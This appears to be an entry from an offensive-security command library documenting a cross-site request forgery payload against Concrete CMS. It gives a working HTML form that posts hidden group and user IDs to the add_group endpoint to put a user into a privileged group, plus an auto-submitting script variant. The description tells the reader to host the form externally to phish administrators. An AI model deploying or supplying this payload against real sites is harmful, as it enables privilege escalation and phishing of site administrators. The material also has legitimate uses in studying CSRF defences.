---
id: cmd-uuid-003
data: >-
  <form
  action="http://www.jmpalktest.com/concrete5742/index.php/ccm/system/user/add_group"
  method="post"><input type="hidden" name="gID" value="3" /> <input
  type="hidden" name="uID" value="6" /> <button type="submit">Csrf your site
  here!</button></form>
tags:
  - csrf
  - html-form
  - external
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:03.289Z'
verified: false
validated: true
submitted: true
---
# html-form-csrf-add-group

## Command

```html
<form action="http://www.jmpalktest.com/concrete5742/index.php/ccm/system/user/add_group" method="post"><input type="hidden" name="gID" value="3" /> <input type="hidden" name="uID" value="6" /> <button type="submit">Csrf your site here!</button></form>
```

## Description

This HTML form submits a POST to Concrete CMS's add_group endpoint with hidden parameters, exploiting CSRF when an admin clicks submit. Host externally to phish admins.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| gID | Group ID value (hidden input) | Yes |
| uID | User ID value (hidden input) | Yes |
| action | Target endpoint URL | Yes |

## Examples

### Basic Usage

```html
<!-- As above; manual submit -->
```

### Advanced Usage

```html
<!-- Auto-submit: Add <script>document.forms[0].submit();</script> -->
<form ...> ... </form><script>document.forms[0].submit();</script>
```

## Expected Output

Form submits; server adds user to group. No visible output; verify in dashboard.

## Related

- [[commands/html-form-csrf-remove-group]]
- [[procedures/Alternative-External-HTML-Form-Exploitation]]
